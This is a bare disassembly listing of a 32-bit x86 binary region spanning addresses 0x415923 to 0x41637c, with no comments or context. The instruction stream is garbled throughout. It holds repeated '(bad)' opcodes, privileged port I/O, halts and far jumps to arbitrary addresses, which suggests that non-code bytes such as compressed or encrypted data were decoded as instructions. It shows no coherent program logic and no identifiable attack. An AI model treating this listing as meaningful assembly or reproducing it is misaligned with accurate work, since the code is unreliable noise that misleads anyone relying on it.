  415923:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415925:	pop    es
  415926:	fwait
  415927:	inc    eax
  415928:	mov    edx,0xbaf847b4
  41592d:	mov    dl,0xf2
  41592f:	jbe    0x415944
  415931:	sub    DWORD PTR [eax+0x77],0x7886ec7d
  415938:	mov    al,BYTE PTR [edi]
  41593a:	out    0xa7,eax
  41593c:	xor    ch,BYTE PTR [ebx+0x3bf6c657]
  415942:	add    ebx,ecx
  415944:	push   ebx
  415945:	cmp    al,0xf5
  415947:	out    dx,eax
  415948:	fbld   TBYTE PTR [edx+0x2682e87f]
  41594e:	sbb    eax,0x1d4fc6c2
  415953:	ret    0x45af
  415956:	push   ebx
  415957:	ret    
  415958:	ja     0x415939
  41595a:	loop   0x415984
  41595c:	mov    edx,DWORD PTR [esi-0x750681bc]
  415962:	lahf   
  415963:	loope  0x415998
  415965:	jmp    0x66846784
  41596a:	mov    bl,bl
  41596c:	repnz push edx
  41596e:	jnp    0x41591b
  415970:	sbb    dl,BYTE PTR [ecx+ebx*8]
  415973:	sahf   
  415974:	popa   
  415975:	ins    DWORD PTR es:[edi],dx
  415976:	loope  0x415912
  415978:	fs sub eax,0xeed58b13
  41597e:	nop
  41597f:	jecxz  0x41593a
  415981:	adc    BYTE PTR [ebp-0x58db8e76],ch
  415987:	dec    esp
  415988:	jb     0x41594e
  41598a:	xchg   ecx,eax
  41598b:	xchg   BYTE PTR [ebx+ecx*1],ch
  41598e:	nop
  41598f:	push   ebp
  415990:	cmp    DWORD PTR [eax],eax
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	aam    0x9
  415a02:	or     al,0xd9
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0x3000001,al
  415a0d:	mov    esi,0x1cabdf3c
  415a12:	(bad)  
  415a13:	dec    ecx
  415a14:	pop    edx
  415a15:	les    ebp,FWORD PTR [esi-0x41b91046]
  415a1b:	stc    
  415a1c:	stos   DWORD PTR es:[edi],eax
  415a1d:	push   cs
  415a1e:	popf   
  415a1f:	push   ecx
  415a20:	add    eax,0x91be7f70
  415a25:	icebp  
  415a26:	cmp    ebx,DWORD PTR [edi]
  415a28:	jne    0x415a90
  415a2a:	psubusw mm7,QWORD PTR [ebp-0x1b]
  415a2e:	ja     0x415a09
  415a30:	mov    bh,0x91
  415a32:	sub    BYTE PTR [ebx+0x4c93928b],dh
  415a38:	push   cs
  415a39:	xor    cl,BYTE PTR [esp+ecx*4-0x5fd393b8]
  415a40:	mov    bh,0x63
  415a42:	push   0x20
  415a44:	les    ecx,FWORD PTR [eax+edi*8-0x4d]
  415a48:	jns    0x415a74
  415a4a:	fiadd  WORD PTR [ebx+0x75339265]
  415a50:	in     al,dx
  415a51:	lds    ecx,FWORD PTR [ebp+0x5fcce015]
  415a57:	shl    esi,1
  415a59:	aaa    
  415a5a:	adc    BYTE PTR [ebp+0x5af87bf4],dl
  415a60:	pop    esi
  415a61:	pop    edi
  415a62:	call   0xa87175bb
  415a67:	sbb    eax,0xe5050054
  415a6c:	aam    0xfc
  415a6e:	pusha  
  415a6f:	push   esp
  415a70:	(bad)  
  415a72:	pop    ecx
  415a73:	push   ss
  415a74:	and    esi,eax
  415a76:	adc    ch,bl
  415a78:	inc    esp
  415a79:	(bad)  [ebx]
  415a7b:	call   0x934b:0x6e8535fb
  415a82:	retf   
  415a83:	inc    eax
  415a84:	ret    0x1ce6
  415a87:	jg     0x415ad6
  415a89:	mov    bl,0xa7
  415a8b:	cli    
  415a8c:	adc    esi,DWORD PTR [ecx*1+0xcc9e88f]
  415a93:	out    dx,eax
  415a94:	xor    DWORD PTR [esi-0x5b7fd40f],ecx
  415a9a:	in     eax,dx
  415a9b:	push   ecx
  415a9c:	xor    eax,0xbc9d9d01
  415aa1:	sbb    BYTE PTR [ebx],0xb
  415aa4:	and    dh,BYTE PTR [eax]
  415aa6:	cmp    edx,DWORD PTR [ebx]
  415aa8:	push   edi
  415aa9:	mov    dh,0xc
  415aab:	idiv   BYTE PTR [ebp+0x6c9f3979]
  415ab1:	sti    
  415ab2:	jmp    0xea9c284f
  415ab7:	imul   ebp,ebx,0xfc743264
  415abd:	cmp    BYTE PTR [edx+ebx*8-0x1e],dl
  415ac1:	stos   DWORD PTR es:[edi],eax
  415ac2:	push   0xe03b2838
  415ac7:	ins    DWORD PTR es:[edi],dx
  415ac8:	es or  al,0xe3
  415acb:	in     al,dx
  415acc:	mov    ds:0x2b92517a,al
  415ad1:	sub    ebp,ebx
  415ad3:	pop    esp
  415ad4:	cdq    
  415ad5:	pushf  
  415ad6:	xor    BYTE PTR es:[esi],0x6e
  415ada:	and    esp,0xdb8812a1
  415ae0:	in     al,dx
  415ae1:	pop    ebx
  415ae2:	mov    DWORD PTR ds:0xe4e9139a,ecx
  415ae8:	and    ebp,DWORD PTR [ebx-0x1a0bd65]
  415aee:	xchg   ebx,eax
  415aef:	mov    al,ds:0x60d369ba
  415af4:	mov    edx,0xb611ee5d
  415af9:	hlt    
  415afa:	jnp    0x415b76
  415afc:	push   ebp
  415afd:	cwde   
  415afe:	std    
  415aff:	hlt    
  415b00:	pusha  
  415b01:	mov    dl,0x8a
  415b03:	rcr    DWORD PTR [edx],cl
  415b05:	outs   dx,DWORD PTR ds:[esi]
  415b06:	dec    edi
  415b07:	sub    eax,0x148c4bfb
  415b0c:	cmp    edi,DWORD PTR [edi]
  415b0e:	fwait
  415b0f:	arpl   ax,bp
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fmul   QWORD PTR [eax]
  415b81:	mov    cs,ebx
  415b83:	push   ds
  415b84:	cmp    esp,ebp
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    eax,0xe9000001
  415b8d:	pop    esp
  415b8e:	iret   
  415b8f:	out    0x5,eax
  415b91:	adc    al,cl
  415b93:	(bad)  
  415b94:	sbb    eax,0xbcf1a145
  415b99:	add    ah,BYTE PTR [ebx-0x4a6600a7]
  415b9f:	sti    
  415ba0:	inc    eax
  415ba1:	arpl   WORD PTR [ecx+ebp*8+0x78d4851d],dx
  415ba8:	sub    ecx,DWORD PTR [esp+edi*2+0x67a9e15]
  415baf:	xor    ebp,esp
  415bb1:	fisttp WORD PTR [ebp-0x299c2e75]
  415bb7:	adc    DWORD PTR [ecx],ecx
  415bb9:	jo     0x415b3b
  415bbb:	xor    DWORD PTR [edi-0x10],ebp
  415bbe:	sub    dh,BYTE PTR [esi-0x720d1183]
  415bc4:	push   ss
  415bc5:	(bad)
  415bc8:	pop    esp
  415bc9:	xchg   esp,eax
  415bca:	xchg   esi,eax
  415bcb:	cmp    BYTE PTR [edi+0x6c],dl
  415bce:	xchg   esi,eax
  415bcf:	add    ebp,DWORD PTR [ebp-0x14]
  415bd2:	add    dl,bh
  415bd4:	sub    DWORD PTR [ecx-0x6],ebx
  415bd7:	outs   dx,BYTE PTR ds:[esi]
  415bd8:	je     0x415bb5
  415bda:	(bad)  
  415bdb:	bound  ebx,QWORD PTR [edi+0x49]
  415bde:	push   eax
  415bdf:	stos   DWORD PTR es:[edi],eax
  415be0:	push   0xb693c491
  415be5:	ds arpl si,di
  415be8:	arpl   bp,di
  415bea:	and    eax,0x7ab5fa88
  415bef:	fucomi st,st(1)
  415bf1:	cld    
  415bf2:	sub    eax,0x623ad759
  415bf7:	jmp    0x3668:0x2378af8
  415bfe:	dec    eax
  415bff:	cmp    DWORD PTR [ecx+0x8],eax
  415c02:	xor    dh,ah
  415c04:	das    
  415c05:	mov    ecx,0x2bf7a320
  415c0a:	ret    0xc663
  415c0d:	xor    eax,0xffffff9e
  415c10:	sbb    al,0x69
  415c12:	add    esi,DWORD PTR [ebp-0x4640e8c7]
  415c18:	push   ds
  415c19:	hlt    
  415c1a:	mov    esp,DWORD PTR [ebp+0x2e]
  415c1d:	dec    edi
  415c1e:	dec    ebp
  415c1f:	cmp    al,0x18
  415c21:	call   0x6e64a746
  415c26:	fucomip st,st(7)
  415c28:	rcl    WORD PTR [edx],1
  415c2b:	jbe    0x415bfe
  415c2d:	mov    dh,0x6a
  415c2f:	push   esi
  415c30:	sub    esi,edi
  415c32:	rcl    ch,0xba
  415c35:	fldenv [edi+0x71c223ab]
  415c3b:	xchg   esp,eax
  415c3c:	fimul  DWORD PTR [ecx]
  415c3e:	outs   dx,DWORD PTR ds:[esi]
  415c3f:	aas    
  415c40:	dec    ebx
  415c41:	pop    ss
  415c42:	jbe    0x415c05
  415c44:	inc    ebp
  415c45:	std    
  415c46:	retf   
  415c47:	add    ecx,DWORD PTR [esi]
  415c49:	ins    DWORD PTR es:[edi],dx
  415c4a:	adc    ah,BYTE PTR [eax+0x5f]
  415c4d:	inc    esi
  415c4e:	mov    dl,0x48
  415c50:	and    BYTE PTR [ecx-0x68],ch
  415c53:	in     eax,0xc7
  415c55:	(bad)
  415c59:	shr    edi,0x11
  415c5c:	or     ch,BYTE PTR [esi+0x3f]
  415c5f:	outs   dx,BYTE PTR ds:[esi]
  415c60:	test   al,0x81
  415c62:	and    DWORD PTR [eax-0x781f8559],0xc
  415c69:	or     BYTE PTR [eax-0x5042ba98],0xc4
  415c70:	push   eax
  415c71:	xor    eax,0x4ca59b27
  415c76:	xchg   ebx,eax
  415c77:	inc    ebx
  415c78:	mov    al,ds:0x436f418e
  415c7d:	fist   WORD PTR [ebx]
  415c7f:	or     al,0x5b
  415c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c82:	cdq    
  415c83:	dec    esi
  415c84:	jbe    0x415c61
  415c86:	xor    ebx,edi
  415c88:	lea    eax,[esi-0x13]
  415c8b:	inc    ecx
  415c8c:	xchg   DWORD PTR [esi+0x3f],ebx
  415c8f:	mov    ah,0xcd
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x44db291f
  415d03:	xchg   DWORD PTR [eax-0x1a],eax
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    eax,0xa8000001
  415d0d:	xchg   esi,eax
  415d0e:	test   eax,0x885e8cdf
  415d13:	jnp    0x415d35
  415d15:	ins    DWORD PTR es:[edi],dx
  415d16:	sub    bh,BYTE PTR [ecx]
  415d18:	mov    bh,BYTE PTR [esi+0x73]
  415d1b:	cmp    edx,DWORD PTR [ebp*1+0x323b5d6b]
  415d22:	xchg   ebp,eax
  415d23:	push   0x7b
  415d25:	cmp    BYTE PTR [ebp+0xb3c2146],ch
  415d2b:	sub    DWORD PTR [edx+0x4a78ef53],ecx
  415d31:	lahf   
  415d32:	sbb    esp,DWORD PTR [ebp-0x15]
  415d35:	push   esi
  415d36:	scas   al,BYTE PTR es:[edi]
  415d37:	sub    ebx,ebp
  415d39:	or     esi,DWORD PTR [eax+edi*2-0x635ec2e6]
  415d40:	pop    eax
  415d41:	and    DWORD PTR [esi-0x5e55988d],edi
  415d47:	sbb    ch,cl
  415d49:	push   ebx
  415d4a:	pop    esi
  415d4b:	jl     0x415d04
  415d4d:	and    eax,0xa914bb62
  415d52:	arpl   WORD PTR [ecx],bx
  415d54:	ins    BYTE PTR es:[edi],dx
  415d55:	xchg   ebx,eax
  415d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d57:	stc    
  415d58:	inc    edx
  415d59:	jno    0x415d68
  415d5b:	daa    
  415d5c:	cwde   
  415d5d:	outs   dx,BYTE PTR ds:[esi]
  415d5e:	gs aaa 
  415d60:	and    DWORD PTR [edx],ecx
  415d62:	clc    
  415d63:	and    edi,edx
  415d65:	jmp    0xb134aeaf
  415d6a:	pop    ebp
  415d6b:	sbb    DWORD PTR [ebx-0x62],esp
  415d6e:	dec    esi
  415d6f:	mov    WORD PTR [ebx-0x20c9890b],cs
  415d75:	dec    esp
  415d76:	ret    0xf2b
  415d79:	pop    es
  415d7a:	aas    
  415d7b:	sahf   
  415d7c:	push   esp
  415d7d:	pop    ss
  415d7e:	or     eax,0x3e49b75f
  415d83:	cmc    
  415d84:	push   cs
  415d85:	ret    
  415d86:	sahf   
  415d87:	pusha  
  415d88:	jl     0x415d47
  415d8a:	sti    
  415d8b:	aam    0xaf
  415d8d:	mov    ebx,0x9d2c9960
  415d92:	cwde   
  415d93:	dec    edi
  415d94:	ds int 0xe
  415d97:	mov    ebp,0x3db67b70
  415d9c:	shr    bl,1
  415d9e:	mov    esp,0x2fb547d9
  415da3:	in     al,0x56
  415da5:	pop    ebp
  415da6:	ss jl  0x415d69
  415da9:	in     al,0x7e
  415dab:	jmp    0x12e2c0ba
  415db0:	test   al,0x1f
  415db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415db4:	push   cs
  415db5:	pop    ds
  415db6:	dec    edi
  415db7:	sub    BYTE PTR [edi+eiz*1],0xc
  415dbb:	(bad)  
  415dbc:	into   
  415dbd:	cmp    eax,0xc956857d
  415dc2:	cmp    bl,ch
  415dc4:	mov    ebx,0xb4e7b695
  415dc9:	xor    al,0x53
  415dcb:	sbb    DWORD PTR [ebp-0x115fa451],ebx
  415dd1:	push   cs
  415dd2:	es enter 0xf689,0xfa
  415dd7:	mov    ch,BYTE PTR [edx+0x7c]
  415dda:	push   edi
  415ddb:	fidiv  DWORD PTR [ebx-0x56d839cb]
  415de1:	(bad)  [ebp-0x50]
  415de4:	mov    ds:0x619e9520,al
  415de9:	inc    ebx
  415dea:	xor    DWORD PTR [esi],eax
  415dec:	pusha  
  415ded:	sar    DWORD PTR [edi+0x62],cl
  415df0:	and    eax,0x9c0bc7cc
  415df5:	ins    DWORD PTR es:[edi],dx
  415df6:	int    0x4e
  415df8:	xchg   esp,eax
  415df9:	push   0xaf185926
  415dfe:	mov    ah,0x86
  415e00:	mov    esi,DWORD PTR [ebp-0x1147d1f3]
  415e06:	mov    ah,0x1e
  415e08:	push   es
  415e09:	cmp    ecx,0x29c9b606
  415e0f:	lds    edi,FWORD PTR [edx]
	...
  415e71:	add    BYTE PTR [eax],al
  415e73:	add    dh,ch
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x48]
  415e81:	add    DWORD PTR [edi+0x2b],ebx
  415e84:	inc    ebp
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR ds:0x72000001,al
  415e8d:	into   
  415e8e:	push   0x79583f41
  415e93:	push   cs
  415e94:	mov    bh,0x5c
  415e96:	aaa    
  415e97:	sbb    edi,ecx
  415e99:	lea    ecx,[edi+0x2b]
  415e9c:	cmp    BYTE PTR [esp+ebp*4+0x3e],al
  415ea0:	sub    BYTE PTR [edx],ch
  415ea2:	inc    ebp
  415ea3:	push   edi
  415ea4:	or     ch,bl
  415ea6:	jle    0x415e31
  415ea8:	sbb    ebp,DWORD PTR [ecx]
  415eaa:	cmp    bl,ah
  415eac:	push   ss
  415ead:	test   al,0xa7
  415eaf:	push   edx
  415eb0:	aam    0x38
  415eb2:	fld    TBYTE PTR [ecx+eiz*4]
  415eb5:	lahf   
  415eb6:	lock push cs
  415eb8:	mov    bl,0xd8
  415eba:	lods   eax,DWORD PTR ss:[esi]
  415ebc:	call   0x1f41f357
  415ec1:	adc    ch,dh
  415ec3:	jmp    0x415f0c
  415ec5:	jne    0x415e90
  415ec7:	jnp    0x415f43
  415ec9:	int3   
  415eca:	out    dx,eax
  415ecb:	push   esp
  415ecc:	popf   
  415ecd:	push   0xbbeb5fd7
  415ed2:	or     eax,0xeb157460
  415ed7:	pop    esi
  415ed8:	jp     0x415e60
  415eda:	pop    edi
  415edb:	enter  0x94f2,0x78
  415edf:	or     eax,0x631b979
  415ee4:	je     0x415e69
  415ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee7:	(bad)  
  415ee8:	mov    al,0xbb
  415eea:	ins    DWORD PTR es:[edi],dx
  415eeb:	lods   eax,DWORD PTR ds:[esi]
  415eec:	pop    edi
  415eed:	mov    DWORD PTR [ebx],esp
  415eef:	loop   0x415e88
  415ef1:	(bad)  
  415ef2:	adc    edi,DWORD PTR [edi+0x2c]
  415ef5:	add    edi,edx
  415ef7:	pushf  
  415ef8:	aas    
  415ef9:	(bad)  
  415efa:	repnz sub esp,DWORD PTR [ebx+0x1c]
  415efe:	dec    esi
  415eff:	fld    DWORD PTR [ebx]
  415f01:	sub    eax,DWORD PTR [esi]
  415f03:	push   ecx
  415f04:	dec    esi
  415f05:	loop   0x415efa
  415f07:	stc    
  415f08:	adc    ch,cl
  415f0a:	xlat   BYTE PTR ds:[ebx]
  415f0b:	inc    edx
  415f0c:	mov    dh,0x6d
  415f0e:	inc    ebx
  415f0f:	jge    0x415ed3
  415f11:	les    edx,FWORD PTR [ecx-0xb40c5ec]
  415f17:	dec    edx
  415f18:	(bad)  
  415f1a:	pushf  
  415f1b:	in     al,dx
  415f1c:	jmp    0x415f76
  415f1e:	mov    dh,0xaf
  415f20:	outs   dx,BYTE PTR ds:[esi]
  415f21:	cmp    BYTE PTR ds:0x514c1dd9,dh
  415f27:	xchg   esi,eax
  415f28:	pop    esi
  415f29:	dec    ecx
  415f2a:	mov    bl,0xc4
  415f2c:	mov    eax,ds:0x95fd6ac4
  415f31:	gs push 0x7201d1f
  415f37:	daa    
  415f38:	mov    ds:0x1deb70c3,eax
  415f3d:	mov    esi,0xd31e6bdc
  415f42:	xor    DWORD PTR [ebp-0x3c],0x7c
  415f46:	(bad)  [edi+0x13]
  415f49:	ja     0x415fc4
  415f4b:	or     ecx,DWORD PTR [edx]
  415f4d:	cmp    DWORD PTR [esi],ecx
  415f4f:	out    dx,al
  415f50:	jne    0x415f07
  415f52:	idiv   dh
  415f54:	in     al,dx
  415f55:	pop    esi
  415f56:	add    eax,0x38e0cbc8
  415f5b:	xor    eax,0x5dd86ae9
  415f60:	stos   DWORD PTR es:[edi],eax
  415f61:	or     esp,DWORD PTR ds:0x6c98b12b
  415f67:	popf   
  415f68:	fs inc ebx
  415f6a:	cmp    DWORD PTR [ebp-0x20],eax
  415f6d:	adc    DWORD PTR [edi-0x4f],edi
  415f70:	scas   eax,DWORD PTR es:[edi]
  415f71:	cdq    
  415f72:	xor    ebx,ecx
  415f74:	shl    DWORD PTR [ecx],0xa0
  415f77:	xlat   BYTE PTR ds:[ebx]
  415f78:	or     edi,DWORD PTR [ebp+0x49c250f5]
  415f7e:	push   es
  415f7f:	imul   ebp,DWORD PTR [edx+edx*1+0x27],0x1d
  415f84:	(bad)  
  415f85:	push   esp
  415f86:	retf   
  415f87:	add    al,BYTE PTR [ebx+0x4e]
  415f8a:	rcl    DWORD PTR [eax+0x36],0x90
  415f8e:	daa    
  415f8f:	and    al,0x9e
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	jp     0x416062
  416002:	test   al,0x9
  416004:	dec    edx
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	xor    BYTE PTR [eax+0x2],0x29
  416010:	pushf  
  416011:	mov    edi,0x1acde506
  416016:	mov    ecx,0x55d2c569
  41601b:	pop    ecx
  41601c:	clc    
  41601d:	xchg   edi,ebp
  41601f:	pop    ecx
  416020:	js     0x41602d
  416022:	xchg   ebp,eax
  416023:	mov    ecx,0x5fd1f916
  416028:	adc    DWORD PTR [ebx-0x6f1dbf73],esi
  41602e:	mov    ecx,0xc4b467a3
  416033:	add    BYTE PTR [ebp+0x53],bh
  416036:	add    eax,0x17a5bf26
  41603b:	mov    bl,0xa1
  41603d:	inc    ebp
  41603e:	popa   
  41603f:	xchg   ebx,eax
  416040:	sub    eax,0xe26e8ef9
  416045:	or     BYTE PTR [edi+0x3b],ch
  416048:	test   eax,0xb9cea26c
  41604d:	je     0x416079
  41604f:	comiss xmm6,xmm0
  416052:	adc    DWORD PTR [edi+0x1f],ecx
  416055:	push   0xf74a4845
  41605a:	sahf   
  41605b:	cmp    eax,eax
  41605d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41605e:	pusha  
  41605f:	fild   QWORD PTR [esi+0x5465edcd]
  416065:	sar    DWORD PTR [ebx],0x13
  416068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416069:	fistp  DWORD PTR [edx]
  41606b:	int3   
  41606c:	inc    edx
  41606d:	in     eax,0x37
  41606f:	and    DWORD PTR ds:0xb2eb26a8,ecx
  416075:	aas    
  416076:	popa   
  416077:	fisubr WORD PTR [eax+0x3ea50a12]
  41607d:	dec    ecx
  41607e:	bound  esp,QWORD PTR [ecx]
  416080:	add    eax,0xc73b82a9
  416085:	mov    bh,0xfe
  416087:	(bad)  
  416088:	dec    ebx
  416089:	and    bh,BYTE PTR [edx+0x6f]
  41608c:	and    BYTE PTR [ebx],ah
  41608e:	sar    edx,1
  416090:	ror    BYTE PTR [esi+0x7f],1
  416093:	ins    BYTE PTR es:[edi],dx
  416094:	ja     0x4160d2
  416096:	leave  
  416097:	fist   WORD PTR ds:0x9355b46d
  41609d:	jno    0x4160be
  41609f:	push   es
  4160a0:	fmul   DWORD PTR [edx+0x58]
  4160a3:	stos   DWORD PTR es:[edi],eax
  4160a4:	repnz in al,0xe1
  4160a7:	adc    eax,DWORD PTR [ebp-0x26]
  4160aa:	test   al,0xd9
  4160ac:	fst    DWORD PTR [esi-0x52]
  4160af:	jbe    0x41603e
  4160b1:	leave  
  4160b2:	(bad)
  4160b5:	dec    edi
  4160b6:	out    dx,eax
  4160b7:	add    DWORD PTR [esi+0x55],ebp
  4160ba:	enter  0x6610,0xf0
  4160be:	mov    cl,0x49
  4160c0:	sbb    BYTE PTR [edx],bh
  4160c2:	inc    ebp
  4160c3:	or     BYTE PTR [ebx],cl
  4160c5:	mov    WORD PTR [ebp+edi*8+0x27],?
  4160c9:	sbb    DWORD PTR [ebx-0x3323f38e],edx
  4160cf:	push   ebx
  4160d0:	add    BYTE PTR [esi+0x4a9c2444],bl
  4160d6:	add    DWORD PTR [edi+0x6a],ebx
  4160d9:	in     eax,dx
  4160da:	in     al,dx
  4160db:	mov    al,ds:0x586e8e2e
  4160e0:	nop
  4160e1:	repz mov ebx,0xe5bf6171
  4160e7:	int3   
  4160e8:	dec    edx
  4160e9:	pop    esi
  4160ea:	push   eax
  4160eb:	lahf   
  4160ec:	cmp    BYTE PTR [ebx-0x10],0x91
  4160f0:	xchg   DWORD PTR [ebx-0x76],edi
  4160f3:	mov    eax,ds:0xa3acff2a
  4160f8:	mov    ebp,0x2c253474
  4160fd:	sub    BYTE PTR [edx+0x39],ah
  416100:	enter  0xe9f2,0x95
  416104:	jbe    0x4160a7
  416106:	inc    eax
  416107:	mov    cl,0x67
  416109:	ficom  WORD PTR es:[edi]
  41610c:	mov    eax,ds:0x1cc72957
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0xaeb64ef3
  416183:	or     eax,0xe94f
  416188:	add    eax,0xf2000001
  41618d:	in     eax,dx
  41618e:	(bad)
  416192:	dec    ebp
  416193:	cmp    ch,BYTE PTR [esi]
  416195:	or     al,0xd5
  416197:	xor    ecx,DWORD PTR [ebx-0x7993a3c7]
  41619d:	xchg   esi,eax
  41619e:	imul   esi,DWORD PTR [ebx],0x1d
  4161a1:	and    BYTE PTR [ecx-0x73],0xe3
  4161a5:	shr    BYTE PTR [edi+0x2107d716],1
  4161ab:	dec    esp
  4161ac:	ret    
  4161ad:	jbe    0x416171
  4161af:	ins    DWORD PTR es:[edi],dx
  4161b0:	inc    edx
  4161b1:	cmp    eax,0xdb947d62
  4161b6:	jnp    0x41614c
  4161b8:	sbb    DWORD PTR [esi-0x6c98bee5],esp
  4161be:	es mov ebx,0x96d6d1b1
  4161c4:	xchg   DWORD PTR [ecx+0x68037bea],ecx
  4161ca:	idiv   DWORD PTR [ecx]
  4161cc:	iret   
  4161cd:	inc    edx
  4161ce:	aam    0xc4
  4161d0:	xchg   BYTE PTR [ebx-0x5b],cl
  4161d3:	les    ebx,FWORD PTR [esi+0x29]
  4161d6:	or     ebp,eax
  4161d8:	out    dx,eax
  4161d9:	inc    ebp
  4161da:	ror    BYTE PTR [edi],1
  4161dc:	leave  
  4161dd:	pop    ebp
  4161de:	mov    cl,0x47
  4161e0:	or     eax,0x858e9e6f
  4161e5:	inc    esi
  4161e6:	fwait
  4161e7:	push   ecx
  4161e8:	mov    dl,0xf8
  4161ea:	test   BYTE PTR ds:0x60fa2da8,bl
  4161f0:	aad    0xcd
  4161f2:	xchg   ebx,eax
  4161f3:	daa    
  4161f4:	sbb    DWORD PTR [eax-0x68],ebx
  4161f7:	cs aam 0xe1
  4161fa:	jo     0x416260
  4161fc:	dec    ecx
  4161fd:	push   ebx
  4161fe:	(bad)  
  4161ff:	pushf  
  416200:	jmp    0x4161c7
  416202:	out    0x32,eax
  416204:	jnp    0x416242
  416206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416207:	add    eax,DWORD PTR [ebx+0x6d8ac4fb]
  41620d:	push   esi
  41620e:	jmp    0xf532:0x580d85d8
  416215:	mov    ebp,0x846bba9c
  41621a:	mov    al,0x95
  41621c:	popf   
  41621d:	mov    dh,0xd6
  41621f:	cld    
  416220:	xor    eax,0x862fb0dc
  416225:	or     edi,DWORD PTR [ecx]
  416227:	lods   eax,DWORD PTR ds:[esi]
  416228:	mov    esi,0x4fcdd8b0
  41622d:	mov    eax,ds:0xcea3a173
  416232:	mov    esp,0x876001f7
  416237:	fistp  DWORD PTR [edx-0x2441166b]
  41623d:	lods   eax,DWORD PTR ds:[esi]
  41623e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41623f:	sbb    bh,BYTE PTR [ebx+ecx*2-0x48d104cb]
  416246:	mov    ds:0x10169c31,al
  41624b:	mov    cl,0x5e
  41624d:	pop    edx
  41624e:	cmp    DWORD PTR [esi+0x35a9f547],edi
  416254:	test   eax,0xe1c4fe75
  416259:	popa   
  41625a:	out    0xea,al
  41625c:	mov    esi,0x407c39e1
  416261:	inc    eax
  416262:	fsub   DWORD PTR [edx+0x72fc673a]
  416268:	add    al,0x21
  41626a:	xor    DWORD PTR ds:0x2c41797c,0xf6a13991
  416274:	and    BYTE PTR [ebx+0x22cafdb1],dl
  41627a:	add    BYTE PTR [ecx-0x36faed94],dh
  416280:	sar    bl,0x39
  416283:	dec    edx
  416284:	gs ss xchg esi,eax
  416287:	and    eax,0x22a0e930
  41628c:	and    dh,ah
  41628e:	ds pop esp
  416290:	pop    edi
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54e4:0xca499aee
  416305:	jmp    0x0:0x1050000
  41630c:	(bad)  
  41630d:	mov    ecx,0x86a3eaed
  416312:	cdq    
  416313:	pop    ecx
  416314:	fbld   TBYTE PTR [ebx]
  416316:	sub    BYTE PTR [ebp+0x0],ah
  416319:	pop    edi
  41631a:	push   ebx
  41631b:	push   ebx
  41631c:	xchg   ebp,eax
  41631d:	out    0xa5,al
  41631f:	and    esi,DWORD PTR [esi-0x79]
  416322:	out    dx,eax
  416323:	pop    edi
  416324:	ret    
  416325:	test   DWORD PTR [eax+0x18],eax
  416328:	xchg   bh,al
  41632a:	sbb    ecx,esp
  41632c:	in     al,0xd1
  41632e:	popf   
  41632f:	cmp    bl,BYTE PTR [esi-0x4558361f]
  416335:	addr16 jp 0x416313
  416338:	jl     0x4162ba
  41633a:	in     eax,0x44
  41633c:	pusha  
  41633d:	or     cl,BYTE PTR [ebx-0x67]
  416340:	test   BYTE PTR [ebx+0x63],bl
  416343:	push   ds
  416344:	jae    0x4162fd
  416346:	sbb    al,BYTE PTR [edi-0x2c05ac4e]
  41634c:	mov    ebx,0xf6a8ca8d
  416351:	cmc    
  416352:	mov    WORD PTR [ecx],?
  416354:	sbb    BYTE PTR [esi],dh
  416356:	or     eax,DWORD PTR [edi-0x43]
  416359:	ret    0x868e
  41635c:	and    dl,BYTE PTR [edx+0x3f6055c6]
  416362:	das    
  416363:	shl    DWORD PTR [eax-0x48],1
  416366:	push   esp
  416367:	inc    ebx
  416368:	jno    0x416381
  41636a:	inc    esi
  41636b:	xchg   bl,ch
  41636d:	xchg   ebp,eax
  41636e:	mov    ah,0x3f
  416370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416371:	int3   
  416372:	push   ebx
  416373:	xor    ecx,edx
  416375:	push   edi
  416376:	out    dx,al
  416377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416378:	daa    
  416379:	mov    es,esi
  41637b:	ins    BYTE PTR es:[edi],dx
  41637c:	ret    0x5acb
